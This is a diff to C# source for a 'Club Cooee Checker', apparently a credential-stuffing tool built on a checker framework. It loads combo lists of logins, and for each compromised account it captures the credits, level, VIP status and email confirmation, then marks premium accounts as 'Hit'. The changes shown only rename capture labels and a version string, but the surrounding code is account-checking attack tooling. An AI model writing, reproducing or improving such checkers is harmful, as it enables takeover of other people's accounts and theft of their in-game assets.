@@ -14,7 +14,7 @@ namespace Club_Cooee_Checker
         static void Main(string[] args)
         {
             var Milky = new MilkyManager();
-            Milky.ProgramManager.Initialize("Club Cooee Checker", "1.0.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
+            Milky.ProgramManager.Initialize("Club Cooee Checker", "1.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
 
             Milky.FileUtils.LoadCombos();
 
@@ -58,10 +58,10 @@ namespace Club_Cooee_Checker
 
                                 if(login.Contains("@"))
                                     captures.Add("Username", (string)user.name);
-                                captures.Add("Credits", (string)user.credits);
-                                captures.Add("XP Level", ((int)user.xp_level).ToString());
+                                captures.Add("Cash", (string)user.credits);
+                                captures.Add("Level", ((int)user.xp_level).ToString());
                                 captures.Add("VIP", ((bool)user.premium).ToString());
-                                captures.Add("Email Confirmed", ((bool)user.email_confirmed).ToString());
+                                captures.Add("Confirmed Email", ((bool)user.email_confirmed).ToString());
 
                                 resultType = (bool)user.premium ? ResultType.Hit : ResultType.Free;
                             }
